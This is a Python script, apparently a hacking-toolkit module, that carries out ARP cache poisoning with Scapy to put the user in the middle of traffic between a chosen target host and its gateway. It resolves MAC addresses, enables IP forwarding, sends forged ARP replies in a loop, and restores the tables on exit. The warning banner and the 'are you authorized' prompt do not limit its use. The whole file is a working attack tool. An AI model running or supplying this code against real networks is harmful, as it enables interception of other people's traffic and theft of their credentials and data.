#!/usr/bin/env python3
"""
ARP Cache Poisoning Tool
A Man-in-the-Middle (MITM) script that spoofs ARP tables to intercept local network traffic.
"""

import sys
import time

def run():
    print("\033[92m" + "="*70)
    print("           ARP CACHE POISONING - MITM Attack Tool")
    print("="*70 + "\033[0m\n")
    
    print("\033[91m[!] CRITICAL WARNING: Use only on networks you own or have written permission!\033[0m")
    print("\033[91m[!] Unauthorized use is illegal and punishable by law.\033[0m\n")
    
    try:
        from scapy.all import ARP, send, get_if_hwaddr, conf
    except ImportError:
        print("\033[91m[!] Scapy library not found.\033[0m")
        print("\033[97m[*] Install it with: pip install scapy\033[0m")
        return
    
    target_ip = input("\033[97m[?] Enter target IP address: \033[0m").strip()
    gateway_ip = input("\033[97m[?] Enter gateway IP address: \033[0m").strip()
    
    if not target_ip or not gateway_ip:
        print("\033[91m[!] Both target and gateway IPs are required.\033[0m")
        return
    
    confirm = input("\n\033[93m[?] Are you authorized to perform this attack? (yes/no): \033[0m").strip().lower()
    if confirm != 'yes':
        print("\033[91m[!] Attack cancelled.\033[0m")
        return
    
    def get_mac(ip):
        """Get MAC address for a given IP"""
        from scapy.all import srp, Ether
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
        if ans:
            return ans[0][1].hwsrc
        return None
    
    def spoof(target_ip, spoof_ip, target_mac):
        """Send spoofed ARP packet"""
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(packet, verbose=False)
    
    def restore(dest_ip, source_ip, dest_mac, source_mac):
        """Restore ARP table"""
        packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
        send(packet, count=4, verbose=False)
    
    print(f"\n\033[92m[*] Getting MAC addresses...\033[0m")
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if not target_mac:
        print(f"\033[91m[!] Could not find MAC for {target_ip}\033[0m")
        return
    if not gateway_mac:
        print(f"\033[91m[!] Could not find MAC for {gateway_ip}\033[0m")
        return
    
    print(f"\033[97m[*] Target MAC: {target_mac}\033[0m")
    print(f"\033[97m[*] Gateway MAC: {gateway_mac}\033[0m")
    
    # Enable IP forwarding
    import platform
    if platform.system() == "Linux":
        import os
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        print("\033[92m[*] IP forwarding enabled\033[0m")
    elif platform.system() == "Windows":
        print("\033[93m[!] Enable IP forwarding manually on Windows\033[0m")
    
    print(f"\n\033[92m[*] Starting ARP poisoning... (Press Ctrl+C to stop)\033[0m\n")
    
    try:
        packets_sent = 0
        while True:
            spoof(target_ip, gateway_ip, target_mac)
            spoof(gateway_ip, target_ip, gateway_mac)
            packets_sent += 2
            print(f"\r\033[97m[*] Packets sent: {packets_sent}\033[0m", end='', flush=True)
            time.sleep(2)
    
    except KeyboardInterrupt:
        print("\n\n\033[92m[*] Restoring ARP tables...\033[0m")
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, target_mac)
        print("\033[92m[*] ARP tables restored. Attack stopped.\033[0m")
    
    except Exception as e:
        print(f"\n\033[91m[!] Error: {str(e)}\033[0m")

if __name__ == "__main__":
    run()
